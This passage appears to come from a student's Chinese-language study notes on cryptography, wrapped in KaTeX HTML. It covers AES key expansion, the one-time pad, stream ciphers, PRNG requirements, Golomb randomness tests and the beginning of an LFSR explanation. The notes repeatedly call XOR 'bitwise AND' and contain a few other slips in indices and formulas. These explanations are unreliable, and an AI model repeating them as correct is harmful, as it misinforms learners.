class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">4</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">4</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>如果w不是4的倍数，那很简单，只需要将w(i-1)和w(i-4)按位与即可。</p><p>如果w是4的倍数，那么复杂一些，需要先把w(i-1)做一点处理，然后再和w(i-4)按位与。</p><p>处理如下。</p><p><img src="https://upyun.wuuconix.link/image-20211004145408372.png" alt="i为4的倍数时的处理" /></p><p>课件里把w(i-1)写成横的了，实际上写成竖的更好，整体往上移位。然后将移位后的结果进行字节代替。</p><p>然后将字节代替后的结果的第一个字节加上一个数r。这个r和i相关。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>2</mn><mrow><mo stretchy="false">(</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>4</mn></mrow></msup></mrow><annotation encoding="application/x-tex">r(i)=2^{(i-1)/4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8879999999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span><span class="mord mtight">/</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></span></p><p>如此操作，我们就能得到10轮轮密钥。</p><p><img src="https://upyun.wuuconix.link/image-20211004145646548.png" alt="轮密钥的诞生" /></p><p>值得注意的是，我们实际用的时候应该是还是得把w转化为方块，然后一行一行来进行按位与。当然把处理后得明文直接按列来直接与也行233。只要是两个16字节的方块按位与即可。</p><p>至此，我们已经厘清了AES的操作。接下来我们分析一下其安全性。</p><p>由于密钥长度的大小，使得暴力破解几乎不可能。</p><p><img src="https://upyun.wuuconix.link/image-20211004150308743.png" alt="暴力破解" /></p><p>同时由于行移位和列混合，导致AES一字节的更改，在10轮的迭代后都产生了蝴蝶效应，防止了伪造明文。</p><p><img src="https://upyun.wuuconix.link/image-20211004150407121.png" alt="蝴蝶效应" /></p></li></ol><h2 id="其他分组密码"><a class="markdownIt-Anchor" href="#其他分组密码"></a> 其他分组密码</h2><ol><li>IDEA</li><li>RC6</li><li>Twofish</li><li>Serpent</li></ol><p>脑容量不够了，这几个就不分析了2333</p><h2 id="差分分析"><a class="markdownIt-Anchor" href="#差分分析"></a> 差分分析</h2><p>以后再说</p><h2 id="one-time-pad"><a class="markdownIt-Anchor" href="#one-time-pad"></a> One-Time Pad</h2><p>维吉尼亚密码做为古典密码中最出色的密码，由于密钥是重复使用的，使得重合指数法利用频率进行分析成为可能。那么如果密钥和明文一样长，并且完全随机呢？</p><p>这种方式加密起来也十分简答， 只要将明文和密钥按位与即可。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo>=</mo><mi>M</mi><mo>⊕</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">C=M \oplus K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span></span></p><p>同时可以证明，OTP是绝对安全的。</p><h2 id="流密码概述"><a class="markdownIt-Anchor" href="#流密码概述"></a> 流密码概述</h2><p>用伪随机来代替随机</p><p>Pseudorandom Number Generator(PRNG)   <code>Pseudorandom: 伪随机数</code></p><p>种子是秘密密钥。</p><p>和OTP类似，只不过把K换掉了。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo>=</mo><mi>M</mi><mo>⊕</mo><mi>P</mi><mi>R</mi><mi>N</mi><mi>G</mi><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>e</mi><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C=M \oplus PRNG(seed)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">G</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mclose">)</span></span></span></span></p><p>分组密码和流密码的方式的差别：</p><ol><li><p>因为分组密码的明文都有位数要求，比如DES的明文要求为64位。而实际要加密的数据肯定不止64位，所以要把数据分成一组一组的，每组都是64位，去加密，这也是分组密码名称的由来。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><msub><mi>c</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mi>i</mi></msub><msub><mi>c</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>=</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><msub><mi>m</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">)</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>c</mi><mi>i</mi></msub><msub><mi>c</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=(c_1c_2..)(c_ic_{i+1}..=e_k(m_1m_2..)e_k(c_ic_{i+1}))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p></li><li><p>而流密码实际上做的就是和伪随机密钥流进行按位与，所以它不用分组，来多少按位与多少即可。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msub><mi>c</mi><mn>1</mn></msub><msub><mi>c</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>=</mo><msub><mi>e</mi><mrow><mi>k</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>m</mi><mn>1</mn></msub><mo stretchy="false">)</mo><msub><mi>e</mi><mrow><mi>k</mi><mn>2</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>m</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">c=c_1c_2..=e_{k1}(m_1)e_{k2}(m_2)..</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">.</span><span class="mord">.</span></span></span></span></p><p>密钥流<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(k_1,k_2,..)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mclose">)</span></span></span></span></p></li></ol><h2 id="流密码性质"><a class="markdownIt-Anchor" href="#流密码性质"></a> 流密码性质</h2><ol><li>数学性质好，因为它模仿OTP，而OTP是绝对保密的，并且伪随机也有很长的研究历史</li><li>加密速度非常快，因为只有按位与</li><li>密钥流只能使用一次。</li><li>应用很广 比如网路、移动通信等等</li></ol><h2 id="伪随机序列发生器-pseudorandom-number-generation"><a class="markdownIt-Anchor" href="#伪随机序列发生器-pseudorandom-number-generation"></a> 伪随机序列发生器 <code>Pseudorandom Number Generation</code></h2><p>由于流密码实际的加密过程只有按位与，几乎不用怎么讲。流密码最难得部分就是伪随机密钥流的生成。</p><p>密码学中对伪随机数的要求：</p><ol><li><p>随机性</p><p>均匀分布：数列中每个数出现 的频率相等或者近似相等</p></li><li><p>不可预测性</p><p>密码分析者很难从数列前面的数预测后面的数</p></li></ol><p>伪随机数的应用</p><ol><li><p>相互认证</p><p>使用一次性随机数来防止重放攻击</p></li><li><p>会话密钥的产生</p><p>用随机数做为会话密钥</p></li><li><p>公钥密码算法中密钥的产生</p><p>用随机数做为公钥密码算法中的密钥</p></li></ol><p>PRNG定义：</p><p>一个伪随机学列发生器G是一个确定的多项式算法，使得</p><ol><li>拓展性：</li><li>伪随机性</li></ol><p>Golomb随机性测试</p><ol><li>在序列的一个周期内，0和1的个数相差至多为1。</li><li>在序列的一个 周期内，长为1的游程占总游程数的1/2，长为2的游程占总数的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">1/2^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>,…长为i的游程占总数的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><msup><mn>2</mn><mi>i</mi></msup></mrow><annotation encoding="application/x-tex">1/2^i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">/</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span></span></span></span></span></span></span>,…，且在等长的游程中，0和1游程的个数至多差1.</li><li>自相关函数为双值（话说双值是什么意思233</li></ol><p><img src="https://upyun.wuuconix.link/image-20211007120025553.png" alt="自相关函数" /></p><p><img src="https://upyun.wuuconix.link/image-20211007120132802.png" alt="例子" /></p><p>周期为31</p><p><img src="https://upyun.wuuconix.link/image-20211007120223398.png" alt="31" /></p><p>1的个数为16，0的个数为15，符合Golomb测试的第一个条件</p><p><img src="https://upyun.wuuconix.link/image-20211007120353902.png" alt="count" /></p><p>Golomb测试的第二个条件中的游程是什么意思呢？实际上就是连续的1或者连续0的情况，比如<code>000</code>就是0的<code>3-游程</code></p><p><img src="https://upyun.wuuconix.link/image-20211007122622599.png" alt="游程" /></p><p>这个字符串总共的游程个数是16个。0和1的<code>1-游程</code>都是4个，总共8个，占16个的一半，正好<code>1/2</code>。<code>2-游程</code>4个，<code>1/4</code>。<code>3-游程</code>两个，<code>1/8</code>。<code>4-游程</code>1个，<code>1/16</code>，<code>5-游程</code>1个，<code>1/16</code>。</p><p>同时在等长的游程中，0和1的游程数量几乎一致，最多差1，符合Golomb测试。</p><h2 id="lsfr-linear-feedback-shift-register"><a class="markdownIt-Anchor" href="#lsfr-linear-feedback-shift-register"></a> LSFR (Linear Feedback Shift Register)</h2><p>是一种PRNG的实例，大概可以翻译为线性反馈移位寄存器233</p><p><img src="https://upyun.wuuconix.link/image-20211007123738827.png" alt="LFSR例子" /></p><p>这张图中，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mi>o</mi></msub></mrow><annotation encoding="application/x-tex">z_o</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>寄存器做为输出端，会把一位传到外面，相当于产生了一个随机数。</p><p>然后就是移位，本来<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">z_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>寄存器的值会传到<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">z_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>上，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>z</mi><mn>2</mn></msub></mrow><annotation 